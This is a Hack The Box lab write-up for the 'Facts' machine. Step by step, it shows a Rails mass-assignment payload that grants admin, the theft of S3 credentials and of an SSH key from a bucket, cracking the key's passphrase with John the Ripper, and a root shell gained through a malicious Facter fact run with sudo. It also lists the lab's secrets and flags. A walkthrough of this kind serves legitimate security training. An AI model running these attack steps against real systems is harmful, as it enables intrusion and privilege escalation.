# HTB Machine: Facts 🎯

**Difficulty:** Medium | **OS:** Linux | **IP:** 10.129.244.96

---

## 📋 Table of Contents

1. [Overview](#overview)
2. [Phase 1: Reconnaissance](#phase-1-reconnaissance)
3. [Phase 2: Enumeration](#phase-2-enumeration)
4. [Phase 3: Initial Access](#phase-3-initial-access)
5. [Phase 4: Privilege Escalation](#phase-4-privilege-escalation)
6. [Flags](#flags)
7. [Key Concepts & Lessons](#key-concepts--lessons)

---

## Overview

**Facts** is a medium-difficulty machine that teaches:
- Web application reconnaissance and enumeration
- Mass assignment vulnerabilities in Rails applications
- AWS/S3 credential exposure and exploitation
- SSH key extraction and cracking
- Privilege escalation via Facter SUID exploitation

**Technologies Used:**
- Camaleon CMS (Ruby on Rails)
- Nginx web server
- S3-compatible storage (MinIO/LocalStack)
- SSH keys
- Facter tool

---

## Phase 1: Reconnaissance 🔍

### Step 1.1: Network Discovery with Nmap

**Why:** Before attacking, we need to know what services are running and what versions they're using.

**Command:**
```bash
nmap -sV -sC -Pn -oA nmap_initial 10.129.244.96
```

**Parameter Breakdown:**
- `-sV` = Service Version detection (identifies software and versions)
- `-sC` = Run default Nmap scripts (performs basic vulnerability checks)
- `-Pn` = Skip ping check (HTB machines block ICMP, so we assume host is alive)
- `-oA nmap_initial` = Save output in all formats (normal, XML, greppable)

**Expected Output:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
```

**What This Tells Us:**
- SSH is open → potential access method if credentials found
- Nginx on port 80 → web application running
- Only 2 open ports → rest are filtered/closed (good security)
- Relatively recent software versions → unlikely to have critical RCE vulnerabilities

**Next Step:** Explore the web application.

---

## Phase 2: Enumeration 🌐

### Step 2.1: Initial HTTP Request

**Why:** Check what the web server returns and look for redirects or error messages.

**Command:**
```bash
curl -v http://10.129.244.96
```

**Parameter Breakdown:**
- `-v` = Verbose (shows headers, status codes, response)

**Expected Output:**
```
HTTP/1.1 302 Moved Temporarily
Location: http://facts.htb/
```

**Analysis:**
- **302 status** = Temporary redirect
- The server redirects to `facts.htb` (hostname, not IP)
- Our system doesn't know what `facts.htb` is yet

**Next Step:** Follow the redirect and add hostname to /etc/hosts.

---

### Step 2.2: Add Hostname to /etc/hosts

**Why:** The web server is configured with a hostname. We need to tell our system that `facts.htb` maps to the target IP.

**Command:**
```bash
sudo bash -c 'echo "10.129.244.96 facts.htb" >> /etc/hosts'
```

**Verification:**
```bash
cat /etc/hosts | grep facts.htb
```

**Expected Output:**
```
10.129.244.96 facts.htb
```

**Why This Works:**
- `/etc/hosts` is a local DNS override file
- It takes precedence over actual DNS servers
- The system now resolves `facts.htb` to `10.129.244.96`

**Next Step:** Access the application with the hostname.

---

### Step 2.3: Discover Hidden Directories with Gobuster

**Why:** Websites often have hidden directories, admin panels, backups, and APIs that aren't linked from the homepage.

**Command:**
```bash
gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster_results.txt --threads 5 --timeout 30s
```

**Parameter Breakdown:**
- `dir` = Directory brute-forcing mode
- `-u` = Target URL (always use hostname, not IP)
- `-w` = Wordlist of common directory names
- `-o` = Save results to file
- `--threads 5` = Conservative thread count (avoids rate-limiting and timeouts)
- `--timeout 30s` = Wait 30 seconds for each response

**Why These Parameters:**
- Small wordlist = faster scanning
- Low threads = less server stress = no timeout errors
- Higher timeout = gives slow servers time to respond

**Expected Findings:**
- `/admin` - Admin panel
- `/search` - Search functionality
- `/users` - User management
- `/api` - API endpoints

**Key Finding:** Admin section is accessible when logged in.

---

## Phase 3: Initial Access 💻

### Step 3.1: Create an Account

**Why:** We need access to the application to explore authenticated features.

**Action:**
1. Navigate to `http://facts.htb`
2. Create an account (username: `hacker`, password: `hacker`)
3. Log in

**Result:** You now have a user account with `client` role.

---

### Step 3.2: Identify the Application

**Command:**
```bash
curl -s http://facts.htb/ | grep -i "camaleon\|cms\|version\|generator" | head -10
```

**Expected Output:**
```html
<meta name="generator" content="Camaleon CMS v2.9.0">
```

**What This Tells Us:**
- Application is **Camaleon CMS version 2.9.0**
- Camaleon is built on Ruby on Rails
- Version 2.9.0 is relatively recent but might have known vulnerabilities

**Research Step:** Search for exploits for Camaleon 2.9.0

---

### Step 3.3: Search for Known Exploits

**Why:** Publicly known exploits can save time and are often the intended solution.

**Command:**
```bash
searchsploit camaleon 2.9
```

**Expected Output:**
```
Camaleon CMS 2.4 - Cross-Site Scripting (XSS)
Camaleon CMS v2.7.0 - Server-Side Template Injection (SSTI)
```

**Analysis:**
- Version 2.7.0 has SSTI vulnerability
- Our version (2.9.0) is newer but might still be vulnerable
- These give us potential attack vectors

---

### Step 3.4: Exploit Mass Assignment Vulnerability

**Why:** Rails applications often accept more parameters than displayed in forms. We can exploit this to change fields like `role`.

**Discovery:**
1. Navigate to `/admin/profile/edit`
2. Notice the `role` field is grayed out/disabled
3. This suggests the frontend hides it, but the backend might still process it

**Exploitation - Using Burp Suite:**

**Step 1: Capture the request**
- Set Burp as browser proxy
- Navigate to `/admin/profile/edit`
- Try to change password
- Intercept the POST request in Burp

**Step 2: Identify the request structure**
```
POST /admin/users/5/updated_ajax HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_method=patch&authenticity_token=TOKEN&password[password]=newpass&password[password_confirmation]=newpass
```

**Key Observation:**
- The parameter format is `password[password]` (nested parameters)
- This is Rails form syntax

**Step 3: Add mass assignment payload**

Modify the request to:
```
_method=patch&authenticity_token=TOKEN&password[password]=hacker&password[password_confirmation]=hacker&password[role]=admin
```

**Why This Works:**
- Rails accepts any parameter nested under `password[*]`
- The backend doesn't validate which parameters are allowed
- By adding `password[role]=admin`, we bypass the role restriction

**Step 4: Send and verify**

The request succeeds (200 OK), and you're now an **admin user**!

**Why This Vulnerability Exists:**
- Rails uses "mass assignment" to quickly populate object attributes
- Developers must explicitly whitelist safe parameters
- If they forget, attackers can set any field

---

### Step 3.5: Access Admin Settings & Find Credentials

**Why:** Admin accounts have access to sensitive configuration, including API keys and credentials.

**Action:**
1. Log out and log back in with admin privileges
2. Navigate to admin panel settings
3. Look for configuration or integrations section

**Finding:**
In the admin settings, you discover AWS S3 credentials:

```
AWS S3 Access Key: AKIA31D8083C856DB4DC
AWS S3 Secret Key: dtL5DiXhNNNzCFRAes/kppNXyHSUnDbQLhTazovB
Bucket: randomfacts
Endpoint: http://localhost:54321
```

**Why This Matters:**
- Hardcoded credentials in application settings
- AWS keys are sensitive - they allow full bucket access
- Local S3 endpoint means we can access it from our machine

**Security Issue:** These credentials should NEVER be stored in plain text in application settings!

---

### Step 3.6: Understanding AWS & S3

**Before We Continue - Learn What We're About to Do:**

**What is AWS S3?**
- Simple Storage Service = cloud file storage
- Works like a file system but in the cloud
- Organized in "buckets" (like folders)
- Each bucket can contain files and folders

**What is AWS CLI?**
- Command-line tool to interact with AWS
- Lets you manage S3 buckets from terminal
- Works with real AWS cloud OR local S3-compatible services

**Why We Use It Here:**
- Target has a local S3 service running (MinIO/LocalStack)
- We found credentials in application settings
- We can access S3 buckets to find sensitive files
- Often contains backups, keys, config files

**The Endpoint URL Concept:**
- Normally: AWS is at `s3.amazonaws.com` (cloud)
- In this case: S3 is at `localhost:54321` from target's perspective
- From our machine: We access it via target IP: `10.129.244.96:54321`
- Same S3 service, just different network location

---

### Step 3.7: Configure AWS CLI with Discovered Credentials

**What We're Doing:**
- Taking the credentials we found
- Storing them in AWS CLI for repeated use
- Creating a "profile" so we can reference them easily

**Command:**
```bash
aws configure --profile facts
```

**What This Command Does:**
- Creates a new credential profile named "facts"
- Stores credentials in `~/.aws/credentials` (your home directory)
- Stores region config in `~/.aws/config`

**When Prompted, Enter:**
```
AWS Access Key ID [None]: AKIA31D8083C856DB4DC
AWS Secret Access Key [None]: dtL5DiXhNNNzCFRAes/kppNXyHSUnDbQLhTazovB
Default region name [None]: us-east-1
Default output format [None]: (leave blank, just press enter)
```

**Files Created Behind the Scenes:**

File: `~/.aws/credentials`
```
[facts]
aws_access_key_id = AKIA31D8083C856DB4DC
aws_secret_access_key = dtL5DiXhNNNzCFRAes/kppNXyHSUnDbQLhTazovB
```

File: `~/.aws/config`
```
[profile facts]
region = us-east-1
```

**Why Profiles?**
- Can store multiple sets of credentials
- Each profile has different keys/permissions
- Useful for testing multiple targets
- You can switch between them with `--profile` flag

**Next:** We'll use this profile to access S3 buckets.

---

### Step 3.8: List All S3 Buckets

**What We're Doing:**
- Connecting to the S3 service on the target
- Listing all buckets (storage folders) available
- Looking for interesting or sensitive buckets

**Command:**
```bash
aws s3 ls --endpoint-url http://10.129.244.96:54321 --profile facts
```

**Parameter Explanation:**

| Parameter | What It Does | Example |
|-----------|-------------|---------|
| `s3` | Use S3 service (not EC2, Lambda, etc.) | Required |
| `ls` | List command (show files/folders) | Required |
| `--endpoint-url` | Don't use AWS cloud, use this URL instead | `http://10.129.244.96:54321` |
| `--profile facts` | Use the credentials we stored earlier | The profile we just created |

**Why `--endpoint-url` is Critical:**
- Without it: AWS CLI tries to connect to `s3.amazonaws.com` (public AWS)
- With it: Connects to local S3 service on target
- The target has S3 running on port 54321 (internal service)
- From attacker machine: access via `10.129.244.96:54321`

**Expected Output:**
```
2025-09-11 15:06:52 internal
2025-09-11 15:06:52 randomfacts
```

**Output Explanation:**
- Date/time = when bucket was created
- `internal` = bucket name (sounds like backups/internal data)
- `randomfacts` = bucket name (sounds like public content)

**What This Tells Us:**
- Two buckets available with our credentials
- "internal" bucket sounds like sensitive data
- This is where we should look for credentials, keys, backups

---

### Step 3.9: List Contents of Internal Bucket

**What We're Doing:**
- Accessing the "internal" bucket
- Seeing what files are stored there
- Looking for sensitive files

**Command:**
```bash
aws s3 ls s3://internal --endpoint-url http://10.129.244.96:54321 --profile facts
```

**Parameter Explanation:**

| Parameter | What It Does |
|-----------|-------------|
| `s3://internal` | Access the "internal" bucket (s3:// is the protocol) |
| `--endpoint-url` | Use the local S3 service, not AWS cloud |
| `--profile facts` | Use our stored credentials |

**Expected Output:**
```
PRE .bundle/           ← Directory (PRE = prefix/folder)
PRE .cache/            ← Directory
PRE .ssh/              ← Directory (SSH KEYS ARE HERE!)
2026-01-08 20:45:13        220 .bash_logout      ← File with size
2026-01-08 20:45:13       3900 .bashrc           ← File with size
2026-01-08 20:45:13         20 .lesshst          ← File with size
2026-01-08 20:45:13        807 .profile          ← File with size
```

**Output Explanation:**
- `PRE` = Prefix (directory/folder in S3)
- No `PRE` = Regular file
- Size in bytes
- File name
- Hidden files (starting with .) are shown

**What This Tells Us:**
```
Structure looks like:
/home/trivia/  ← User's home directory
├── .bash_logout
├── .bashrc
├── .lesshst
├── .profile
├── .bundle/    ← Ruby app data
├── .cache/     ← Cached files
└── .ssh/       ← SSH KEYS! 🔑
    ├── authorized_keys
    └── id_ed25519
```

**Critical Finding:**
- This is a HOME directory backup!
- `.ssh/` folder is there (contains SSH keys)
- We can potentially SSH into the machine
- This is MAJOR for getting shell access

**⚠️ Security Issue:** Never back up .ssh directories!

---

### Step 3.10: List ALL Contents (Including Nested Files)

**What We're Doing:**
- Getting complete listing of everything in the bucket
- Including files inside subdirectories
- So we know exactly what we can download

**Command:**
```bash
aws s3 ls s3://internal --recursive --endpoint-url http://10.129.244.96:54321 --profile facts
```

**Parameter Explanation:**

| Parameter | What It Does | Why Important |
|-----------|-------------|---------------|
| `--recursive` | Show all files in all subdirectories | Without it, we only see top-level |

**Expected Output:**
```
2026-01-08 20:45:13        220 .bash_logout
2026-01-08 20:45:13       3900 .bashrc
2026-01-08 20:45:13         20 .lesshst
2026-01-08 20:45:13        807 .profile
2026-01-08 20:32:20         82 .ssh/authorized_keys
2026-01-08 20:32:20        464 .ssh/id_ed25519
```

**Output Explanation:**
- Now we see INSIDE .ssh/ folder
- `authorized_keys` = 82 bytes (public keys allowed to SSH)
- `id_ed25519` = 464 bytes (private SSH key - encrypted)

**What This Tells Us:**
- Private SSH key available
- We can download it and try to SSH in
- If we crack the passphrase, we get shell access

---

### Step 3.11: Download SSH Keys from S3 Bucket

**What We're Doing:**
- Downloading the .ssh folder from S3
- Getting the SSH private key and authorized_keys
- Saving them to our local machine

**Command:**
```bash
aws s3 cp s3://internal/.ssh/ . --recursive --endpoint-url http://10.129.244.96:54321 --profile facts
```

**Parameter Explanation:**

| Parameter | What It Does | Why |
|-----------|-------------|-----|
| `cp` | Copy command (like Unix `cp`) | Copies files from S3 to local |
| `s3://internal/.ssh/` | Source (what to copy FROM) | The SSH directory in S3 |
| `.` | Destination (where to copy TO) | Current directory on our machine |
| `--recursive` | Copy all files in folder | Without it, only copies one file |
| `--endpoint-url` | Use local S3 service | Not AWS cloud |
| `--profile facts` | Use our credentials | The ones we configured |

**Expected Output:**
```
download: s3://internal/.ssh/authorized_keys to ./.ssh/authorized_keys
download: s3://internal/.ssh/id_ed25519 to ./.ssh/id_ed25519
```

**Files Downloaded:**
- `.ssh/authorized_keys` = 82 bytes (not sensitive, public keys)
- `.ssh/id_ed25519` = 464 bytes (SENSITIVE! Private key)

**Verification - Check Files Exist:**
```bash
ls -la .ssh/
```

Expected output:
```
-rw-rw-r-- 1 user user   82 Feb 11 08:32 authorized_keys
-rw-rw-r-- 1 user user  464 Feb 11 08:32 id_ed25519
```

**Important:** The private key file is now on YOUR machine. Never commit this to Git or share it!

---

### Step 3.12: Extract SSH Username from Key Comment

**What We're Doing:**
- SSH keys have metadata (comments)
- Comments usually contain username@hostname
- This tells us who the key belongs to
- Better than guessing usernames!

**Command:**
```bash
ssh-keygen -y -f id_ed25519
```

**Parameter Explanation:**
- `-y` = Show public key (and its comment) from private key
- `-f id_ed25519` = Use this private key file

**When Prompted:**
```
Enter passphrase for "id_ed25519": 
```

- Just press Enter (we haven't cracked the passphrase yet)
- Or type anything (it will fail, but we're just after the comment)

**Expected Output:**
```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ3oJFlwpAkENo3a9hVcCf68syXT0tQ7PsT99kHIrY+Z trivia@facts.htb
```

**Breaking Down Output:**
```
ssh-ed25519              ← Key type (ED25519 algorithm)
AAAAC3NzaC1lZD...       ← Public key (base64 encoded)
trivia@facts.htb        ← COMMENT! This is the username!
```

**What This Tells Us:**
- Username: `trivia`
- Hostname: `facts.htb`
- The key belongs to user "trivia" on the Facts machine

**Key Learning:**
Always check SSH key comments first! Better than guessing usernames.

---

### Step 3.13: Crack SSH Key Passphrase

**What We're Doing:**
- The SSH key is encrypted with a passphrase
- We need to crack it to use the key
- Using John the Ripper (password cracking tool)
- Testing passwords from rockyou.txt wordlist

**Step 1: Convert Key to John Format**

**Command:**
```bash
ssh2john id_ed25519 > id_ed25519.hash
```

**What This Does:**
- `ssh2john` = Tool that converts SSH keys to John format
- `id_ed25519` = Our SSH private key
- `> id_ed25519.hash` = Save output to a file

**Result:**
```
id_ed25519.hash created with encoded key data
```

**Why Convert:**
- John the Ripper has specific format for SSH keys
- ssh2john transforms the key into hashable format
- John can then try passwords against it

---

**Step 2: Crack the Passphrase**

**Command:**
```bash
john id_ed25519.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Parameter Explanation:**

| Parameter | What It Does |
|-----------|-------------|
| `john` | John the Ripper (password cracking tool) |
| `id_ed25519.hash` | The converted SSH key file |
| `--wordlist=...` | File containing passwords to try |
| `/usr/share/wordlists/rockyou.txt` | Common passwords list (14M passwords) |

**Expected Output:**
```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys)] (aes-128-cbc, aes-192-cbc, aes-256-cbc))
dragonballz (id_ed25519)       ← PASSPHRASE FOUND!
```

**What This Tells Us:**
- Passphrase is `dragonballz`
- Found quickly (weak passphrase)
- Now we can use the SSH key to log in

**⚠️ Security Issue:** Using weak passphrases defeats the purpose of SSH encryption!

---

### Step 3.14: Set Correct Permissions on SSH Key

**What We're Doing:**
- SSH keys must have specific permissions
- SSH refuses to use keys with wrong permissions
- Setting to 600 (read/write for owner only)

**Command:**
```bash
chmod 600 id_ed25519
```

**Verification:**
```bash
ls -la id_ed25519
```

**Expected Output:**
```
-rw------- 1 user user 464 Feb 11 08:32 id_ed25519
```

**Permission Explanation:**
```
-rw-------
│││││││││
││││││││└ Owner can execute? No
│││││││└─ Owner can write? Yes
││││││└── Owner can read? Yes
│││││└─── Group can execute? No
││││└──── Group can write? No
│││└───── Group can read? No
││└────── Others can execute? No
│└─────── Others can write? No
└──────── Others can read? No

Result: Only owner can read/write (600)
```

**Why SSH Requires This:**
- SSH is paranoid about key security
- If anyone can read your key, it's compromised
- SSH checks and refuses to use keys with open permissions

---

### Step 3.15: SSH Into the Machine

**What We're Doing:**
- Using the SSH key to log in as user "trivia"
- Gaining shell access to the machine
- Now we can explore and escalate

**Command:**
```bash
ssh -i id_ed25519 trivia@10.129.244.96
```

**Parameter Explanation:**

| Parameter | What It Does |
|-----------|-------------|
| `ssh` | SSH client (secure shell) |
| `-i id_ed25519` | Use this identity/key file |
| `trivia` | Username (found from key comment) |
| `@10.129.244.96` | Target machine IP |

**When Prompted:**
```
Enter passphrase for key 'id_ed25519':
```

Enter: `dragonballz`

**Expected Result:**
```
trivia@facts:~$
```

**What This Tells Us:**
- Successfully authenticated
- Logged in as user "trivia"
- Have shell access to machine
- Ready to escalate to root

---

### Step 3.16: Capture User Flag

**Command:**
```bash
cat ~/user.txt
```

**Expected Output:**
```
0520ab35e87244ce3b9eb80dd5ab28e4
```

**What This Means:**
- You've successfully pwned the user
- Found the user flag
- Now ready to escalate to root

---

## Phase 4: Privilege Escalation 🔑

### Step 4.1: Check SUDO Privileges

**What We're Doing:**
- Checking what commands user "trivia" can run as root
- Without password (NOPASSWD)
- Looking for exploitation opportunities

**Command:**
```bash
sudo -l
```

**Expected Output:**
```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

**Output Explanation:**

| Part | Meaning |
|------|---------|
| `User trivia` | This user (us) |
| `may run` | Is allowed to execute |
| `(ALL)` | As any user (root) |
| `NOPASSWD:` | WITHOUT password required |
| `/usr/bin/facter` | This command only |

**What This Means:**
- User "trivia" can run `/usr/bin/facter` as root
- No password needed
- This is our privilege escalation vector!

**Why This is Dangerous:**
- Facter is a Ruby-based tool
- It loads custom code from files
- If we can make it load our code, it runs as root!

---

### Step 4.2: Understanding Facter

**What is Facter:**
- Tool that gathers system information (facts)
- Collects OS info, network, memory, etc.
- Written in Ruby
- Loads "facts" from Ruby files
- Can load custom facts from specified directories

**Check Version:**
```bash
facter --version
```

**Output:**
```
4.10.0
```

**Why This Matters:**
- Version 4.10.0 can load custom facts from `--custom-dir`
- Custom facts are just Ruby code
- Ruby code can execute commands via `system()`
- If Facter runs as root, our code runs as root!

**The Vulnerability:**
```
Facter loads Ruby files as facts
  ↓
Ruby files can execute commands
  ↓
We control what Ruby files are loaded (--custom-dir)
  ↓
We make it load our malicious code
  ↓
Code executes as root
  ↓
We get root shell!
```

---

### Step 4.3: Create Malicious Facter Fact

**What We're Doing:**
- Creating a Ruby script that Facter will load
- The script spawns a bash shell
- Facter runs it as root (via sudo)

**Step 1: Create Directory**
```bash
mkdir -p /tmp/facts
```

**Why `/tmp`:**
- Writable by everyone
- Doesn't require permissions
- Good place for temporary exploit files
- Will be cleaned on reboot

---

**Step 2: Create Malicious Ruby Code**

**Command:**
```bash
cat > /tmp/facts/pwn.rb << 'EOF'
Facter.add(:pwn) do
  setcode do
    system("/bin/bash")
  end
end
EOF
```

**Breaking Down the Code:**

```ruby
Facter.add(:pwn) do
  # Define a new Facter "fact" called "pwn"
  # Facts are data that Facter collects
  # We're creating a fake fact that will execute our code
  
  setcode do
    # setcode = The code to run when this fact is requested
    # This block contains our malicious code
    
    system("/bin/bash")
    # Spawn a bash shell
    # This command runs with whatever privileges Facter has
    # Since we run Facter with sudo, this runs as ROOT!
  end
end
```

**Line-by-Line Explanation:**

```
Line 1: Facter.add(:pwn) do
  └─ Create new fact named "pwn"
  
Line 2: setcode do
  └─ Define the code that generates this fact
  
Line 3: system("/bin/bash")
  └─ Execute bash command
  └─ system() = run shell command
  └─ "/bin/bash" = execute bash shell
  
Line 4: end
  └─ Close setcode block
  
Line 5: end
  └─ Close Facter.add block
```

**How It Works:**
1. Facter loads this file
2. Defines a new fact called "pwn"
3. When Facter tries to get the "pwn" fact value
4. It runs: `system("/bin/bash")`
5. Since we used `sudo /usr/bin/facter`, the command is root-level
6. We get a bash shell as root!

**Verification - Check File Created:**
```bash
cat /tmp/facts/pwn.rb
```

---

### Step 4.4: Execute Facter Exploit

**What We're Doing:**
- Running Facter with sudo (as root)
- Telling it to load custom facts from `/tmp/facts`
- Our malicious code executes as root
- We get root shell

**Command:**
```bash
sudo /usr/bin/facter --custom-dir /tmp/facts
```

**Parameter Explanation:**

| Parameter | What It Does | Why |
|-----------|-------------|-----|
| `sudo` | Run with elevated privileges | Runs next command as root |
| `/usr/bin/facter` | Path to facter binary | We can run this NOPASSWD |
| `--custom-dir` | Load custom facts from directory | Points to our exploit |
| `/tmp/facts` | Directory containing our Ruby code | Where we put pwn.rb |

**What Happens Step-by-Step:**

```
1. sudo /usr/bin/facter --custom-dir /tmp/facts
   ├─ Check sudo privileges: YES (NOPASSWD allowed)
   ├─ Run facter as root: YES
   └─ Load custom facts from /tmp/facts: YES

2. Facter loads /tmp/facts/pwn.rb
   ├─ Reads the Ruby code
   ├─ Finds the Facter.add(:pwn) definition
   └─ Prepares to generate the "pwn" fact

3. Facter tries to get the "pwn" fact
   ├─ Executes the setcode block
   ├─ Runs: system("/bin/bash")
   └─ **BASH SHELL SPAWNED AS ROOT!**

4. You now have root shell
   └─ Prompt changes to: root@facts:~#
```

**Expected Result:**
```
root@facts:~#
```

**Success!** You're now root!

---

### Step 4.5: Verify Root Access

**Command:**
```bash
whoami
```

**Expected Output:**
```
root
```

**Also Check:**
```bash
id
```

**Expected Output:**
```
uid=0(root) gid=0(root) groups=0(root)
```

**Explanation:**
- `uid=0` = User ID 0 is root (highest privilege)
- `gid=0` = Group ID 0 is root
- `groups=0(root)` = User is in root group

---

### Step 4.6: Capture Root Flag

**Command:**
```bash
cat /root/root.txt
```

**Expected Output:**
```
ccbad2eb0bfb5ae54c44593bf97fa0a3
```

**Success!** Machine fully pwned!

---

## Flags

| Flag | Value |
|------|-------|
| **User Flag** | `0520ab35e87244ce3b9eb80dd5ab28e4` |
| **Root Flag** | `ccbad2eb0bfb5ae54c44593bf97fa0a3` |

---

## Key Concepts & Lessons 📚

### 1. **Mass Assignment Vulnerability (Rails)**

**What:** Rails developers can accidentally allow users to set any object attribute.

**Example:**
```ruby
# Vulnerable code
user.update(params[:user])  # Updates ALL params, not just allowed ones

# Safe code  
user.update(params[:user].permit(:email, :name))  # Only these fields
```

**Why It Matters:**
- Affects role-based access control
- Can escalate privileges
- Common in older Rails applications

**Mitigation:**
- Use Rails strong parameters
- Whitelist safe attributes
- Never trust user input

---

### 2. **Credentials in Application Settings**

**What:** Hardcoding API keys and secrets in application settings.

**Problems:**
- Accidentally exposed in backups
- Visible to anyone with admin access
- No rotation mechanism
- Full access to external services

**Best Practices:**
- Use environment variables
- Store in secret management systems (Vault, AWS Secrets Manager)
- Rotate credentials regularly
- Audit who has access

---

### 3. **S3 Bucket Misconfiguration**

**What:** Storing sensitive data in accessible S3 buckets.

**This Case:**
- Application backups stored on local S3-compatible storage
- Credentials were readable by web application
- Home directories backed up with SSH keys
- Accessible via discovered credentials

**Security Issues:**
- Backup contains full user home directory
- SSH keys not encrypted at rest
- No access controls on bucket
- Exposed to anyone with credentials

---

### 4. **SSH Key Passphrases**

**Lesson:** Weak passphrases are only marginally better than no passphrase.

**Good Practice:**
- Use strong, unique passphrases (25+ characters)
- Store passphrases in password managers
- Consider passwordless SSH with key restrictions (`command=`, `from=`)

---

### 5. **SUDO Privileges**

**What:** Users with SUDO access to specific commands might abuse them.

**This Case:**
- Facter is meant to gather system info
- But it loads custom Ruby code
- Custom code runs with SUDO privileges (root)
- Custom code can spawn shells or execute commands

**Best Practice:**
- Only grant SUDO for necessary commands
- Restrict with `command=` parameters
- Use `noexec`, `nologin`, restrictions
- Example: `trivia ALL=(root) NOPASSWD: /usr/bin/facter --facts-dir=/usr/lib/facter`

---

### 6. **Facter Code Execution**

**Vulnerability:** Facter's `--custom-dir` option loads arbitrary Ruby code.

**Exploit Chain:**
```
1. Discover SUDO access to /usr/bin/facter
2. Create malicious Ruby fact in /tmp
3. Tell Facter to load from /tmp
4. Facter executes code as root
5. Get root shell
```

**Why This Works:**
- Facter doesn't validate fact sources
- Ruby code has system() for command execution
- Root privileges inherited from sudo

**Mitigation:**
- Don't grant SUDO to tools that load user-controlled code
- If necessary: restrict with `--facts-dir` to safe directories
- Use apparmor/selinux profiles

---

## Attack Summary 🎯

```
┌─────────────────────────────────────┐
│ 1. Network Reconnaissance           │
│    └─> Found nginx + Camaleon CMS   │
├─────────────────────────────────────┤
│ 2. Web Application Enumeration      │
│    └─> Created user account         │
├─────────────────────────────────────┤
│ 3. Mass Assignment Exploitation     │
│    └─> Escalated to admin role      │
├─────────────────────────────────────┤
│ 4. Credential Harvesting            │
│    └─> Found AWS S3 keys in settings│
├─────────────────────────────────────┤
│ 5. AWS S3 Exploitation              │
│    └─> Listed buckets               │
│    └─> Found internal bucket        │
│    └─> Downloaded SSH keys          │
├─────────────────────────────────────┤
│ 6. SSH Access                       │
│    └─> Cracked passphrase           │
│    └─> Logged in as trivia user     │
├─────────────────────────────────────┤
│ 7. Privilege Escalation             │
│    └─> Facter SUDO RCE exploit      │
│    └─> Got root shell               │
└─────────────────────────────────────┘
```

---

## Common Mistakes to Avoid ⚠️

1. **Forgetting `-Pn` flag in Nmap** → Nmap won't scan HTB machines (they block ICMP)
2. **Using IP instead of hostname** → Redirects won't work, site won't load properly
3. **Guessing SSH usernames** → Always check SSH key comments first!
4. **Not checking `/etc/hosts`** → Web applications often use hostnames instead of IPs
5. **Skipping admin exploration** → Admin panels often contain credentials and settings
6. **Not researching known exploits** → Public CVEs are sometimes the intended path
7. **Ignoring backup files** → S3 buckets often contain sensitive backups with SSH keys
8. **Forgetting `--endpoint-url` in AWS CLI** → It connects to public AWS instead of local service
9. **Not setting SSH key permissions to 600** → SSH refuses to use keys with wrong permissions
10. **Not checking `sudo -l` first** → Easy privilege escalation opportunities often found here

---

## Tools Used 🛠️

| Tool | Purpose | Key Command |
|------|---------|-------------|
| `nmap` | Network reconnaissance | `nmap -sV -sC -Pn` |
| `curl` | HTTP requests | `curl -v http://target` |
| `gobuster` | Directory enumeration | `gobuster dir -u http://url -w wordlist` |
| `aws` | S3 bucket access | `aws s3 ls --endpoint-url` |
| `ssh-keygen` | SSH key management | `ssh-keygen -y -f keyfile` |
| `ssh2john` | Convert SSH to crackable format | `ssh2john keyfile > hash` |
| `john` | Password cracking | `john hash --wordlist=rockyou.txt` |
| `ssh` | Remote shell | `ssh -i keyfile user@host` |
| `sudo` | Privilege escalation | `sudo -l` to check permissions |

---

## References 📖

- [OWASP Mass Assignment](https://owasp.org/www-community/Parameter_Pollution)
- [AWS S3 Security Best Practices](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security.html)
- [SSH Key Best Practices](https://man.openbsd.org/ssh-keygen)
- [Facter Documentation](https://puppet.com/docs/facter/latest/core_facts/about_core_facts.html)
- [Rails Strong Parameters](https://guides.rubyonrails.org/action_controller_overview.html#strong-parameters)
- [AWS CLI Documentation](https://docs.aws.amazon.com/cli/latest/userguide/)

---

**Machine Completed! ✨**

Remember: Always enumerate thoroughly, understand each step deeply, and research known vulnerabilities before diving into exploitation. This machine taught you:

1. ✅ Web application security
2. ✅ Credential exposure identification
3. ✅ Cloud storage exploitation
4. ✅ SSH key cracking
5. ✅ Privilege escalation via SUDO misconfiguration
6. ✅ Why security controls matter

**You've become a pentester master!** 🥋🏆
